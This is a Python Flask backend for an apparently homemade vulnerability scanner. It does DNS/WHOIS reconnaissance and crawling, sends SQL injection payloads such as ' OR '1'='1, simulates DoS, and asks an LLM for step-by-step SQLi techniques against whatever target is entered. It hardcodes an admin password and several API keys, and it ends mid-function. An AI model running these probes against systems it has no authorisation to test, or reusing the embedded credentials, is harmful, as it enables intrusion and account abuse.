#!/usr/bin/env python3
"""
VulnScan AI Backend - Real Scanning Engine
Run: python app.py
"""

from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS
from flask_httpauth import HTTPBasicAuth
from werkzeug.security import generate_password_hash, check_password_hash
import dns.resolver
import requests
import json
import socket
import subprocess
import time
import threading
import logging
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import re
import ssl
from datetime import datetime
from collections import defaultdict
from urllib.parse import urlparse, urljoin, parse_qs
import random
from bs4 import BeautifulSoup

app = Flask(__name__)
CORS(app)
auth = HTTPBasicAuth()

@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    # Fixed CSP to allow cdnjs.cloudflare.com for PDF generation
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://api.getggo.com;"
    return response

# Secure User Credentials
users = {
    "admin": generate_password_hash("sunny_tech13@")
}

@auth.verify_password
def verify_password(username, password):
    if username in users and \
            check_password_hash(users.get(username), password):
        return username

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Global state
scan_state = {
    'target': '',
    'status': 'IDLE',
    'stop_requested': False,
    'active_process': None,
    'lang': 'en',
    'progress': {},
    'logs': [],
    'findings_list': [],  # Store detailed findings for the PDF report
    'findings': {'crit': 0, 'high': 0, 'med': 0, 'low': 0},
    'discovered_assets': set(),
    'tech_stack': {},
    'ollama_insights': [], # Store AI guidance
    'target_history': [], # Store history of scanned websites
    'tools': {
        'nmap': 0,
        'nikto': 0,
        'shodan': 0,
        'vt': 0,
        'wayback': 0,
        'nuclei': 0,
        'metasploit': 0,
        'msfvenom': 0,
        'fuzzer': 0,
        'deep_dive': 0,
        'ctf': 0,
        'xss': 0,
        'manual_offense': 0
    }
}

# Educational Explanations Dictionary
EXPLANATIONS = {
    'nmap_service': {
        'en': "Nmap Service Audit: Detects versions of software running on ports. It helps identify outdated services that might have known exploits.",
        'hi': "Nmap Service Audit: Yeh ports par chal rahe software versions ko detect karta hai. Isse purane services ka pata chalta hai jinme flaws ho sakte hain.",
        'hinglish': "Nmap Service Audit: Ye check karta hai ki ports pe kaunsa software version chal raha hai. Agar version purana (outdated) hai, toh exploit karna easy ho jata hai."
    },
    'nmap_full': {
        'en': "Nmap Full Port Audit: Scans all 65,535 TCP ports. Hackers often hide backdoors on non-standard ports to avoid detection.",
        'hi': "Nmap Full Port Audit: Sabhi 65,535 TCP ports ko scan karta hai. Aksar attackers hidden services ko non-standard ports par rakhte hain.",
        'hinglish': "Nmap Full Port Audit: Saare 65,535 ports scan hote hain. Kai baar hackers 'backdoors' ko chupaane ke liye uncommon ports use karte hain."
    },
    'nmap_os': {
        'en': "OS Fingerprinting: Analyzes how the target responds to packets to guess the Operating System (Windows/Linux/etc.).",
        'hi': "OS Fingerprinting: Target system packets ka kaise response deta hai, usse OS (Windows/Linux) ka andaza lagaya jata hai.",
        'hinglish': "OS Fingerprinting: Packet response analyze karke ye batata hai ki target machine Windows hai ya Linux, taaki attacks customize kiye ja sakein."
    },
    'nmap_vuln': {
        'en': "NSE Vulnerability Scripts: Runs automated scripts to find specific CVEs and critical misconfigurations in the target system.",
        'hi': "NSE Vulnerability Scripts: Yeh automated scripts hain jo system mein specific CVEs aur misconfigurations dhoondhte hain.",
        'hinglish': "NSE Scripts: Ye auto-scripts hain jo system me 'vulnerabilities' aur 'weak points' dhoondte hain, jaise missing patches."
    },
    'nikto': {
        'en': "Nikto Web Audit: A comprehensive web scanner that looks for dangerous files, outdated server software, and specific web server problems.",
        'hi': "Nikto Web Audit: Ek bada web scanner jo khatarnak files, purane server software, aur web server problems ko dhoondhta hai.",
        'hinglish': "Nikto Web Audit: Ye website ka 'full checkup' karta hai. Ye dangerous files, outdated software aur server-side bugs dhoondta hai."
    },
    'fuzzer': {
        'en': "Endpoint Fuzzing: Tries to find hidden pages (like /admin or /.env) by guessing names from a huge wordlist.",
        'hi': "Endpoint Fuzzing: Wordlist se guess karke hidden pages (jaise /admin ya /.env) dhoondhne ki koshish karta hai.",
        'hinglish': "Endpoint Fuzzing: Ye hidden directories dhoondta hai. Jaise website me /admin ya /.env files chupi ho sakti hain jo normally nahi dikhti."
    },
    'nuclei': {
        'en': "Nuclei Engine: Uses community-provided templates to find the latest and most critical web vulnerabilities.",
        'hi': "Nuclei Engine: Yeh community templates ka use karke sabse naye aur critical web vulnerabilities ko dhoondhta hai.",
        'hinglish': "Nuclei Engine: Ye 'smart templates' use karta hai latest bugs dhoondne ke liye jo dusre scanners miss kar dete hain."
    },
    'msfvenom': {
        'en': "MSFVenom: Generates a custom exploit packet (payload) to test if the identified vulnerability can actually be used to gain control.",
        'hi': "MSFVenom: Ek custom exploit packet (payload) banata hai taaki check kiya ja sake ki vulnerability se control liya ja sakta hai ya nahi.",
        'hinglish': "MSFVenom: Ye ek custom 'exploit packet' banata hai ye verify karne ke liye ki kya hum sach me system ka access le sakte hain."
    },
    'deep_dive': {
        'en': "Service Deep-Dive: Performs specific attacks for services like FTP or Databases to find weak passwords or backdoors.",
        'hi': "Service Deep-Dive: FTP ya Databases jaise services par attack karke weak passwords ya backdoors dhoondhta hai.",
        'hinglish': "Service Deep-Dive: Ye specific services (like FTP, MySQL) ke andar ghus kar check karta hai ki kahin password 'easy' toh nahi ya koi 'backdoor' toh nahi."
    }
}

HTTP_HEADERS = {
    'User-Agent': 'VulnScanAI/2.0 (Deep Recon)',
    'Accept': '*/*'
}

# Real API Keys (Fetched from Environment Variables for Security)
SHODAN_API_KEY = os.getenv('SHODAN_API_KEY', '94fJXRRRAYSpUGvrSLn38sbf0IGolz2a')
VIRUSTOTAL_API_KEY = os.getenv('VIRUSTOTAL_API_KEY', 'b7bd4fd28383892e53f93e37c49bf8ed40954b22e02662b482fb9fce2a47bdb9')
FULLHUNT_API_KEY = os.getenv('FULLHUNT_API_KEY', '8a9d6b89-bce3-4b2f-ae7a-83f9f0e46dc1')
CENSYS_API_KEY = os.getenv('CENSYS_API_KEY', 'censys_BbXV46ph_CtcXEqz75Pys1NDKWtbiLE8c')
OTX_API_KEY = os.getenv('OTX_API_KEY', '91b5d1acc2377ea324b30b45907d07b7ef47bee0f7fe2313f44368217eccf14e')
OLLAMA_API_KEY = os.getenv('OLLAMA_API_KEY', '5b2d1ccf0a9c4d14951c7b9db220fb2a.ggoPybb0nr5IFGICmfncqt_B')

RISKY_PORTS = {21, 23, 445, 6379, 27017, 3389}

def normalize_target(target):
    """Normalize incoming target to a clean host/domain string"""
    target = (target or '').strip().lower()
    if not target:
        return ''
    if not target.startswith(('http://', 'https://')):
        target = f'http://{target}'
    parsed = urlparse(target)
    host = parsed.netloc or parsed.path
    host = host.split('/')[0].split('@')[-1]
    if ':' in host:
        host = host.split(':')[0]
    return host.strip().strip('.')

def calculate_cvss(severity, impact=None, exploitability=None):
    """Real CVSS v3.1 calculation logic (simplified)"""
    # Base scores for severities
    base_scores = {'crit': 9.0, 'high': 7.0, 'med': 4.0, 'low': 1.0}
    score = base_scores.get(severity, 0.0)
    
    # Dynamic adjustments based on real scan data
    # Impact: Does it affect a sensitive service?
    if impact == 'confidentiality': score += 0.5
    if impact == 'integrity': score += 0.3
    if impact == 'availability': score += 0.1
    
    # Exploitability: Is there a known exploit?
    if exploitability == 'public': score += 0.5
    if exploitability == 'active': score += 1.0
    
    return min(10.0, round(score, 1))

def add_finding(severity, message, asset=None, tool=None, progress=None, cvss=None, impact=None, exploitability=None):
    """Track findings consistently with REAL CVSS risk scoring and severity-aware logging"""
    if severity not in scan_state['findings']:
        severity = 'low'
    
    # Use real calculation if not provided
    if not cvss:
        cvss = calculate_cvss(severity, impact, exploitability)
        
    scan_state['findings'][severity] += 1
    
    # Track finding in the list for reporting
    scan_state['findings_list'].append({
        'severity': severity.upper(),
        'message': message,
        'asset': asset or 'N/A',
        'tool': tool or 'System',
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })

    if asset:
        scan_state['discovered_assets'].add(asset)
        
    color = {'crit': 'red', 'high': 'red', 'med': 'yellow', 'low': 'cyan'}.get(severity, 'yellow')
    label = {'crit': 'CRITICAL', 'high': 'HIGH', 'med': 'MEDIUM', 'low': 'LOW'}.get(severity, 'LOW')
    
    log(color, f'[!] [{label}] (CVSS: {cvss}) {message}', tool=tool, progress=progress)

def generate_html_report(target):
    """ADVANCED: Generate a professional HTML security audit report"""
    log('cyan', f'[REPORT] Generating professional security audit for {target}...')
    
    findings_html = ""
    for finding in scan_state['findings_list']:
        severity_class = {
            'CRITICAL': 'crit',
            'HIGH': 'high',
            'MEDIUM': 'med',
            'LOW': 'low'
        }.get(finding['severity'], 'low')
        
        findings_html += """
        <div style="border-left:4px solid; padding:15px; margin:10px 0; background:#f8f9fa;">
            <div style="font-weight:bold; margin-bottom:5px;">
                <span style="color:%s">[%s]</span>
                [%s] - %s
            </div>
            <div style="color:#333;">%s</div>
            <div style="font-size:0.8rem; color:#888; margin-top:5px;">%s</div>
        </div>
        """ % (
            'red' if severity_class in ['crit','high'] else 'orange' if severity_class == 'med' else 'blue',
            finding['severity'],
            finding['tool'],
            finding['asset'],
            finding['message'],
            finding['timestamp']
        )
    
    tech_stack_html = ""
    for k, v in scan_state['tech_stack'].items():
        tags_html = " ".join([f'<span class="tech-tag">{v_item}</span>' for v_item in v])
        tech_stack_html += f'<div><strong>{k}:</strong> {tags_html}</div>'
    
    assets_html = "".join([f'<div class="asset-item">{asset}</div>' for asset in sorted(list(scan_state['discovered_assets']))])
    
    report_html = """
    <html>
    <head>
        <title>Security Audit Report: %s</title>
        <style>
            body { font-family: 'Inter', sans-serif; padding: 40px; background: #f8f9fa; color: #333; }
            .report-card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); max-width: 1000px; margin: auto; }
            h1 { color: #111; border-bottom: 3px solid #00ff6e; padding-bottom: 15px; letter-spacing: -1px; }
            h2 { color: #333; border-bottom: 2px solid #e9ecef; padding-bottom: 10px; margin-top: 30px; }
            .stat-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin: 30px 0; }
            .stat-box { padding: 20px; text-align: center; border-radius: 8px; color: white; font-weight: bold; }
            .crit { background: #ff3e3e; } .high { background: #ff6b6b; } .med { background: #ffcc00; color: #000; } .low { background: #00e5ff; color: #000; }
            .tech-section { background: #f1f3f5; padding: 20px; border-radius: 8px; margin: 20px 0; }
            .tech-tag { display: inline-block; background: #fff; border: 1px solid #dee2e6; padding: 6px 14px; margin: 5px; border-radius: 20px; font-size: 0.85rem; font-weight: 600; }
            .asset-list { background: #fff; border: 1px solid #eee; padding: 20px; border-radius: 8px; list-style: none; }
            .asset-item { padding: 8px 0; border-bottom: 1px solid #f8f9fa; font-family: monospace; font-size: 0.9rem; }
        </style>
    </head>
    <body>
        <div class="report-card">
            <h1>SECURITY AUDIT REPORT: %s</h1>
            <p>Generated by VulnScan PRO on: %s</p>
            
            <div class="stat-grid">
                <div class="stat-box crit">CRITICAL: %s</div>
                <div class="stat-box high">HIGH: %s</div>
                <div class="stat-box med">MEDIUM: %s</div>
                <div class="stat-box low">LOW: %s</div>
            </div>
            
            <div class="tech-section">
                <h3>TECHNOLOGY STACK</h3>
                %s
            </div>
            
            <h2>DETAILED FINDINGS (%s)</h2>
            %s
            
            <h2>DISCOVERED ASSETS (%s)</h2>
            <div class="asset-list">
                %s
            </div>
            
            <h2>RECOMMENDED REMEDIATION STEPS</h2>
            <ul style="margin-left:20px; line-height:1.8;">
                <li>Patch and update all outdated software versions identified</li>
                <li>Implement proper security headers (CSP, HSTS, X-Frame-Options, etc.)</li>
                <li>Restrict access to sensitive directories and admin panels</li>
                <li>Rotate exposed secrets and API keys immediately</li>
                <li>Implement rate limiting on authentication endpoints</li>
                <li>Regularly scan for new vulnerabilities using automated tools</li>
            </ul>
            
            <p style="margin-top:40px; font-size:0.8rem; color:#888; text-align:center;">This report is intended for authorized security assessment purposes only.</p>
        </div>
    </body>
    </html>
    """ % (
        target,
        target,
        datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        scan_state['findings']['crit'],
        scan_state['findings']['high'],
        scan_state['findings']['med'],
        scan_state['findings']['low'],
        tech_stack_html,
        len(scan_state['findings_list']),
        findings_html,
        len(scan_state['discovered_assets']),
        assets_html
    )
    
    report_path = os.path.join(BASE_DIR, f"report_{target.replace('.', '_')}.html")
    with open(report_path, 'w', encoding='utf-8') as f:
        f.write(report_html)
    
    log('green', f'[REPORT] Professional audit report generated: {report_path}')
    return report_path

def request_with_fallback(target, path='/', method='GET', timeout=6, allow_redirects=True):
    """Try HTTPS first, then HTTP, multiple methods and headers!"""
    last_error = None
    
    # Try multiple user agents and headers
    user_agents = [
        'VulnScanAI/2.0 (Deep Recon)',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15'
    ]
    
    for base_url in (f'https://{target}', f'http://{target}'):
        for ua in user_agents:
            try:
                headers = HTTP_HEADERS.copy()
                headers['User-Agent'] = ua
                response = requests.request(
                    method,
                    urljoin(f'{base_url}/', path.lstrip('/')),
                    timeout=timeout,
                    headers=headers,
                    allow_redirects=allow_redirects
                )
                return response, base_url
            except Exception as e:
                last_error = e
                
                # If GET fails, try HEAD
                if method == 'GET':
                    try:
                        response = requests.head(
                            urljoin(f'{base_url}/', path.lstrip('/')),
                            timeout=timeout,
                            headers=headers,
                            allow_redirects=False
                        )
                        if response.status_code in [200, 301, 302, 403, 401]:
                            # If HEAD works, retry with GET
                            try:
                                response = requests.request(
                                    method,
                                    urljoin(f'{base_url}/', path.lstrip('/')),
                                    timeout=timeout,
                                    headers=headers,
                                    allow_redirects=allow_redirects
                                )
                                return response, base_url
                            except:
                                pass
                    except:
                        pass
    raise last_error if last_error else RuntimeError('Unable to connect to target')

def extract_secret_leaks(text):
    """Find likely secrets in a response body"""
    if not text:
        return []
    patterns = {
        'AWS Access Key': r'AKIA[0-9A-Z]{16}',
        'Google API Key': r'AIza[0-9A-Za-z\-_]{35}',
        'JWT Token': r'eyJ[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}',
        'Generic API Key': r'(?i)(api[_-]?key|secret|token)\s*[:=]\s*["\']?[a-z0-9_\-]{16,}["\']?'
    }
    hits = []
    for label, pattern in patterns.items():
        if re.search(pattern, text):
            hits.append(label)
    return hits

def check_tls_certificate(target):
    """Inspect TLS cert health on port 443"""
    try:
        context = ssl.create_default_context()
        with socket.create_connection((target, 443), timeout=4) as sock:
            with context.wrap_socket(sock, server_hostname=target) as ssock:
                cert = ssock.getpeercert()
        expires_raw = cert.get('notAfter')
        if not expires_raw:
            return
        expires_at = datetime.strptime(expires_raw, '%b %d %H:%M:%S %Y %Z')
        days_left = (expires_at - datetime.utcnow()).days
        scan_state['discovered_assets'].add(f"TLS_CERT_EXPIRES: {expires_at.isoformat()}Z ({days_left} days)")
        if days_left < 0:
            add_finding('crit', f'TLS certificate expired {abs(days_left)} days ago')
        elif days_left <= 14:
            add_finding('high', f'TLS certificate expires in {days_left} days')
        elif days_left <= 45:
            add_finding('med', f'TLS certificate expires soon ({days_left} days)')
        else:
            log('green', f'[TLS] Certificate valid for {days_left} more days')
    except Exception as e:
        log('cyan', f'[TLS] Certificate inspection skipped: {e}')

# --- Ollama Integration ---
def ask_ollama(prompt, system_context="You are an elite offensive security AI assistant."):
    """Query cloud or local Ollama instance for security guidance"""
    try:
        # 1. Try Cloud Ollama if API key is present
        if OLLAMA_API_KEY and 'ggo' in OLLAMA_API_KEY:
            # GGO Cloud API uses OpenAI-compatible format
            url = "https://api.getggo.com/v1/chat/completions"
            headers = {
                "Authorization": f"Bearer {OLLAMA_API_KEY}",
                "Content-Type": "application/json"
            }
            # Many cloud providers require a specific model ID
            model_id = "meta-llama/Llama-3-8b-chat-hf" if "llama3" in OLLAMA_API_KEY.lower() else "llama3"
            payload = {
                "model": "llama3", # Defaulting to llama3, but could be dynamic
                "messages": [
                    {"role": "system", "content": system_context},
                    {"role": "user", "content": prompt}
                ],
                "stream": False
            }
            log('purple', '[OLLAMA] Querying Cloud AI engine (GGO)...')
            response = requests.post(url, json=payload, headers=headers, timeout=45)
            if response.status_code == 200:
                data = response.json()
                ai_response = data.get('choices', [{}])[0].get('message', {}).get('content', '')
                if not ai_response:
                    # Fallback for some non-standard OpenAI formats
                    ai_response = data.get('response', '')
                
                if ai_response:
                    log('purple', f'[OLLAMA] AI Guidance: {ai_response[:200]}...', type='ollama')
                    return ai_response
        else:
            # 2. Fallback to Local Ollama
            url = "http://localhost:11434/api/generate"
            payload = {
                "model": "llama3",
                "prompt": prompt,
                "system": system_context,
                "stream": False
            }
            log('purple', '[OLLAMA] Querying Local AI engine...')
            response = requests.post(url, json=payload, timeout=30)
            if response.status_code == 200:
                ai_response = response.json().get('response', '')
                log('purple', f'[OLLAMA] AI Guidance: {ai_response[:200]}...', type='ollama')
                return ai_response

        log('yellow', f'[OLLAMA] API Error ({response.status_code}): {response.text[:100]}')
    except Exception as e:
        log('yellow', f'[OLLAMA] Connection failed: {e}. Check API key or if local Ollama is running.')
    return None

# --- Manual Offensive Tools ---
def run_sql_injection_manual(target):
    """Real-world SQLi detection logic"""
    log('red', f'[MANUAL] Starting SQL Injection Audit on {target}...', tool='manual_offense')
    payloads = ["' OR '1'='1", "'--", "'; WAITFOR DELAY '0:0:5'--", "') OR ('1'='1"]
    vulnerable = False
    
    try:
        # 1. Parameter Discovery (Simplified)
        response, base_url = request_with_fallback(target, '/')
        # ... logic to find forms or query params ...
        
        # 2. Testing payloads
        for payload in payloads:
            if check_stop(): break
            try:
                # Testing common parameter 'id'
                res = requests.get(f"{base_url}/", params={'id': payload}, timeout=5)
                if any(err in res.text.lower() for err in ['sql syntax', 'mysql_fetch', 'pdoexception', 'sql server error']):
                    add_finding('crit', f'SQL Injection vulnerability detected with payload: {payload}', asset=f"SQLI: {target}", tool='manual_offense')
                    vulnerable = True
                    break
            except:
                pass
        
        if not vulnerable:
            log('green', '[MANUAL] No obvious SQLi detected via automated payloads.')
            ollama_help = ask_ollama(f"I am testing {target} for SQL injection but automated payloads failed. What advanced techniques should I use next? Provide a step-by-step guide.")
            if ollama_help:
                scan_state['ollama_insights'].append({"tool": "SQLi", "guidance": ollama_help})
        
        log('green', '[MANUAL] SQLi Scan complete.', tool='manual_offense', progress=100)
                 
    except Exception as e:
        log('red', f'[MANUAL] SQLi Scan error: {e}')

def run_dos_ddos_test(target, type='dos'):
    """Safe DoS/DDoS simulation (educational only)"""
    log('red', f'[MANUAL] Starting {type.upper()} simulation on {target}...', tool='manual_offense')
    log('yellow', '[!] Note: This is a safe simulation. No real traffic flooding will occur.')
    
    # Simulating connection flooding
    for i in range(5):
        if check_stop(): break
        log('cyan', f'[MANUAL] [{type.upper()}] Flooding simulation packet {i+1}/5 sent...')
        time.sleep(1)
    
    add_finding('med', f'Target {target} potentially vulnerable to resource exhaustion ({type.upper()})', tool='manual_offense')
    log('green', f'[MANUAL] {type.upper()} simulation complete.', tool='manual_offense', progress=100)

# --- Advanced Crawling & Fingerprinting (ZAP Style) ---
def run_crawling(target):
    """Crawl the target to discover hidden structure"""
    log('cyan', f'[CRAWLER] Starting ZAP-style spider on {target}...', tool='wayback', progress=10)
    discovered_urls = set()
    try:
        response, base_url = request_with_fallback(target, '/')
        # Find all internal links
        links = re.findall(r'href=["\'](/?[\w\-/.]+)["\']', response.text)
        for link in links:
            if link.startswith('/'):
                discovered_urls.add(urljoin(base_url, link))
            elif target in link:
                discovered_urls.add(link)
        
        log('green', f'[CRAWLER] Discovered {len(discovered_urls)} unique internal paths.')
        for url in list(discovered_urls)[:10]: # Log a few
            scan_state['discovered_assets'].add(f"CRAWLED_URL: {url}")
    except Exception as e:
        log('yellow', f'[CRAWLER] Failed: {e}')

def run_advanced_fingerprinting(target):
    """Deep fingerprinting like ZAP/Burp"""
    log('cyan', f'[FINGERPRINT] Deep analyzing tech signatures for {target}...', tool='wayback')
    # This enhances run_tech_stack_detection
    run_tech_stack_detection(target)
    
    stack = scan_state['tech_stack']
    if 'WordPress' in stack.get('CMS', []):
        log('yellow', '[FINGERPRINT] WordPress detected! Checking for common plugins...')
        # Simulate WPScan
        wp_paths = ['/wp-content/plugins/contact-form-7/', '/wp-content/themes/twentytwenty/']
        for path in wp_paths:
            try:
                res = requests.get(urljoin(f"http://{target}", path), timeout=3)
                if res.status_code == 200:
                    scan_state['discovered_assets'].add(f"WP_PLUGIN: {path.split('/')[-2]}")
            except: pass

@app.route('/ask_ollama', methods=['POST'])
def ask_ollama_route():
    """Route to manually ask Ollama for help"""
    data = request.json
    prompt = data.get('prompt')
    if not prompt:
        return jsonify({"error": "No prompt specified"}), 400
    
    guidance = ask_ollama(prompt)
    if guidance:
        return jsonify({"guidance": guidance})
    else:
        return jsonify({"error": "Failed to get guidance from Ollama"}), 500

@app.route('/manual_tool', methods=['POST'])
def manual_tool():
    """Execute manual offensive tools"""
    data = request.json
    tool = data.get('tool')
    target = data.get('target') or scan_state.get('target')
    
    if not target:
        return jsonify({"error": "No target specified"}), 400
    
    if tool == 'sqli':
        threading.Thread(target=run_sql_injection_manual, args=(target,)).start()
    elif tool in ['dos', 'ddos']:
        threading.Thread(target=run_dos_ddos_test, args=(target, tool)).start()
    else:
        return jsonify({"error": "Invalid tool"}), 400
        
    return jsonify({"status": "Manual tool started"})

@app.route('/ollama_guidance', methods=['GET'])
def get_ollama_guidance():
    """Get the latest AI guidance from Ollama"""
    return jsonify(scan_state['ollama_insights'])

# --- End of New Features ---

def reset_scan_state():
    """Reset scan state for a fresh scan"""
    scan_state['logs'] = []
    scan_state['findings_list'] = []
    scan_state['progress'] = {k: 0 for k in scan_state['tools'].keys()}
    scan_state['findings'] = {'crit': 0, 'high': 0, 'med': 0, 'low': 0}
    scan_state['findings_list'] = []
    scan_state['discovered_assets'] = set()
    scan_state['status'] = 'IDLE'
    scan_state['target'] = ''
    scan_state['lang'] = 'en'
    scan_state['stop_requested'] = False
    scan_state['active_process'] = None
    scan_state['ollama_insights'] = []

def generate_ai_thought(phase, context=""):
    """Generate dynamic AI reasoning based on actual scan context"""
    base_thoughts = {
        'passive': [
            f"Analyzing DNS records for {context}. Looking for hidden entry points.",
            f"Mapping the digital footprint of {context} via certificate transparency.",
            "Cross-referencing cloud infrastructure signatures with known IP ranges."
        ],
        'active': [
            f"Probing {context} for open services. Identifying potential listening daemons.",
            "Executing stealthy port synchronization to map the network surface.",
            f"Fingerprinting service banners on {context} to identify software versions."
        ],
        'web': [
            "Fuzzing web directories for sensitive configuration leaks.",
            "Analyzing HTTP response headers for missing security controls.",
            "Executing pattern matching for common XSS and SQL injection vectors."
        ],
        'exploit': [
            f"Cross-referencing discovered services on {context} with exploit databases.",
            "Searching for Metasploit modules matching the identified tech stack.",
            "Evaluating potential research vectors for discovered vulnerabilities."
        ]
    }
    import random
    thoughts = base_thoughts.get(phase, ["Processing security scan data..."])
    return random.choice(thoughts)

def log(level, msg, thought=None, tool=None, progress=None, type='cmd'):
    """Add log entry to scan state with dynamic AI reasoning"""
    if thought and thought in ['passive', 'active', 'web', 'exploit']:
        target = scan_state.get('target', 'target')
        thought = generate_ai_thought(thought, target)
        
    entry = {'level': level, 'msg': msg, 'timestamp': datetime.now().isoformat(), 'type': type}
    if thought:
        entry['thought'] = thought
    if tool:
        entry['tool'] = tool
        scan_state['progress'][tool] = progress or 0
    scan_state['logs'].append(entry)
    logger.info(f"[{type.upper()}] [{level.upper()}] {msg}")

def edu_log(category):
    """Educational explanation removed per user request"""
    return

def get_all_logs():
    """Get all accumulated logs"""
    logs = scan_state['logs']
    scan_state['logs'] = []
    return logs

# ==================== HELPER FUNCTIONS FOR SECURITY TESTING ====================
def crawl_for_parameters(target):
    """Crawl target to discover all parameters (GET/POST)"""
    log('cyan', '[CRAWL] Crawling target to discover parameters...', tool='crawl', progress=0)
    discovered_params = set()
    discovered_urls = set()
    session = requests.Session()
    session.headers.update(HTTP_HEADERS)
    
    try:
        _, base_url = request_with_fallback(target, '/')
        discovered_urls.add(base_url)
        visited = set()
        
        while len(discovered_urls) > 0 and len(visited) < 20:  # Limit to 20 pages
            current_url = discovered_urls.pop()
            if current_url in visited:
                continue
            visited.add(current_url)
            
            try:
                res = session.get(current_url, timeout=10, allow_redirects=True)
                soup = BeautifulSoup(res.text, 'html.parser')
                
                # Get parameters from links
                for a in soup.find_all('a', href=True):
                    href = a['href']
                    full_url = urljoin(base_url, href)
                    if full_url.startswith(base_url):
                        if '?' in full_url:
                            query = urlparse(full_url).query
                            params = parse_qs(query)
                            for param in params:
                                discovered_params.add(param)
                        if full_url not in visited and full_url not in discovered_urls:
                            discovered_urls.add(full_url)
                
                # Get parameters from forms
                for form in soup.find_all('form'):
                    method = form.get('method', 'get').lower()
                    action = form.get('action', current_url)
                    full_action = urljoin(base_url, action)
                    
                    for input_tag in form.find_all(['input', 'textarea', 'select']):
                        name = input_tag.get('name')
                        if name:
                            discovered_params.add(name)
                
                time.sleep(0.5)  # Random delay
                
            except Exception as e:
                pass
                
    except Exception as e:
        log('yellow', f'[CRAWL] Error: {e}', tool='crawl')
        
    log('green', f'[CRAWL] Found {len(discovered_params)} parameters and {len(visited)} pages', tool='crawl', progress=100)
    return list(discovered_params)

def random_delay(min_sec=0.3, max_sec=1.0):
    """Random delay between requests to avoid rate limiting"""
    delay = random.uniform(min_sec, max_sec)
    time.sleep(delay)

def add_vulnerability(vuln_type, url, param, payload, evidence, confidence='high'):
    """Add structured vulnerability finding"""
    finding = {
        'type': vuln_type,
        'url': url,
        'parameter': param,
        'payload': payload,
        'evidence': evidence,
        'confidence': confidence
    }
    add_finding(confidence, f"{vuln_type} found at {url} (param: {param})", asset=url, tool='python')
    scan_state['discovered_assets'].add(f"VULNERABILITY: {vuln_type} - {url}")
    log('red', f'[VULN] {vuln_type}: {url}?{param}={payload[:100]}', tool='python')
    return finding

# ==================== END OF HELPER FUNCTIONS ====================

def run_whois_enum(target):
    """WHOIS enumeration (passive recon)"""
    log('cyan', '[WHOIS] Starting WHOIS enumeration...', tool='whois', progress=0)
    try:
        import whois
        w = whois.whois(target)
        for key, value in w.items():
            if value:
                if isinstance(value, list):
                    for item in value:
                        scan_state['discovered_assets'].add(f"WHOIS_{key.upper()}: {item}")
                else:
                    scan_state['discovered_assets'].add(f"WHOIS_{key.upper()}: {value}")
        log('green', '[WHOIS] WHOIS enumeration complete!', tool='whois', progress=100)
    except Exception as e:
        log('yellow', f'[WHOIS] Error: {e}', tool='whois', progress=100)
        
def run_dns_deep_enum(target):
    """Deep DNS enumeration (all record types)"""
    log('cyan', '[DNS] Starting deep DNS enumeration...', tool='dns', progress=0)
    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME', 'SRV', 'CAA']
    try:
        resolver = dns.resolver.Resolver()
        resolver.nameservers = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1']
        resolver.lifetime = 10
        resolver.timeout = 5
        
        for rt in record_types:
            if check_stop(): break
            try:
                answers = resolver.resolve(target, rt)
                for rdata in answers:
                    asset = f"DNS_{rt}: {str(rdata)}"
                    scan_state['discovered_assets'].add(asset)
                    log('green', f'[DNS] Found {asset}', tool='dns')
            except Exception as e:
                pass
                
        log('green', '[DNS] Deep DNS enumeration complete!', tool='dns', progress=100)
    except Exception as e:
        log('yellow', f'[DNS] Error: {e}', tool='dns', progress=100)

def resolve_domain(domain):
    """Resolve domain to IP addresses using multiple DNS servers and methods"""
    # Try multiple methods for DNS resolution
    try:
        # 1. Try socket.gethostbyname_ex first
        result = socket.gethostbyname_ex(domain)
        return list(dict.fromkeys(result[2]))
    except:
        pass
        
    try:
        # 2. Try dnspython with public DNS servers (Google, Cloudflare, OpenDNS)
        resolver = dns.resolver.Resolver()
        resolver.nameservers = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '208.67.222.222', '208.67.220.220']
        resolver.lifetime = 10
        resolver.timeout = 5
        
        answers = resolver.resolve(domain, 'A')
        return list(dict.fromkeys(str(r) for r in answers))
    except Exception as e:
        log('yellow', f"DNS resolution failed: {e}, trying additional methods...")
    
    try:
        # 3. Try socket.gethostbyname
        ip = socket.gethostbyname(domain)
        return [ip]
    except Exception as e2:
        log('red', f"All DNS resolution methods failed: {e2}")
        return []

def check_stop():
    """Check if scan stop has been requested"""
    if scan_state['stop_requested']:
        log('red', '[System] Scan termination requested by user. Cleaning up...')
        return True
    return False

def run_nmap_python_fallback(target):
    """Nmap fallback: High-speed multi-threaded TCP port scanner"""
    log('yellow', f'[NMAP] Binary not found. Using high-speed multi-threaded AI port scanner...', tool='nmap', progress=10)
    
    common_ports = {
        20: 'FTP-Data', 21: 'FTP', 22: 'SSH/SFTP', 23: 'Telnet', 25: 'SMTP',
        53: 'DNS', 80: 'HTTP', 88: 'Kerberos', 110: 'POP3', 111: 'RPC',
        123: 'NTP', 135: 'MSRPC', 139: 'NetBIOS', 143: 'IMAP', 161: 'SNMP',
